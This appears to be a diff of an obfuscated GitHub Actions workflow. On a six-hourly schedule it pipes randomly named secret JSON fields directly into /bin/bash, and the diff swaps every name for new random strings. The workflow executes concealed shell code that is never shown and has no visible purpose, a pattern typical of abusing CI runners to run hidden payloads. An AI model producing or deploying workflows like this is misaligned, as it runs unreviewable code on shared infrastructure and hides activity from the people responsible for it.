@@ -2,32 +2,28 @@ name: dodgeballthinkable
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 0/6 * * *'
+    - cron: '2 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: dodgeballthinkable
         env:
-          x74: ${{ secrets.x74 }}
+          y36: ${{ secrets.y36 }}
         run: |
-          echo $x74 | jq -r .sra34448 | /bin/bash
-          echo $drjf1 | jq -r .owyv383 | /bin/bash
-          echo $sz11565 | jq -r .wavf80 | /bin/bash
-          echo $wanbz220 | jq -r .iv131 | /bin/bash
-          echo $ga17646 | jq -r .cb8461 | /bin/bash
-          echo $z7 | jq -r .zb161 | /bin/bash
-          echo $ckg755 | jq -r .kiok947 | /bin/bash
-          echo $cnl50467 | jq -r .fswlr276 | /bin/bash
-          echo $a106 | jq -r .nrs6 | /bin/bash
-          echo $ia955 | jq -r .ss315 | /bin/bash
-          echo $zzvem1350 | jq -r .s21 | /bin/bash
-          echo $hvq67483 | jq -r .hjpp7 | /bin/bash
-          echo $e80687 | jq -r .fmr37 | /bin/bash
-          echo $kondm4 | jq -r .kla761 | /bin/bash
-          echo $xtxaq29 | jq -r .wy2 | /bin/bash
-          echo $ew27322 | jq -r .jkfb85 | /bin/bash
-          echo $ya743 | jq -r .lrpu24 | /bin/bash
+          echo $y36 | jq -r .idt497 | /bin/bash
+          echo $dcqw6 | jq -r .zlcxh6981 | /bin/bash
+          echo $hkgl55 | jq -r .x43157 | /bin/bash
+          echo $g7781 | jq -r .qvh9 | /bin/bash
+          echo $fxz66 | jq -r .h2351 | /bin/bash
+          echo $bxx491 | jq -r .oodrf7 | /bin/bash
+          echo $ju1 | jq -r .zzl73 | /bin/bash
+          echo $zs09 | jq -r .t63 | /bin/bash
+          echo $vk47 | jq -r .dr7814 | /bin/bash
+          echo $c5288 | jq -r .r3028 | /bin/bash
+          echo $nn264 | jq -r .jqqso1 | /bin/bash
+          echo $iu05 | jq -r .cmzjb6 | /bin/bash
+          echo $mvr95449 | jq -r .wyuea12432 | /bin/bash
+          echo $ybcuj647 | jq -r .bbrp83 | /bin/bash
 
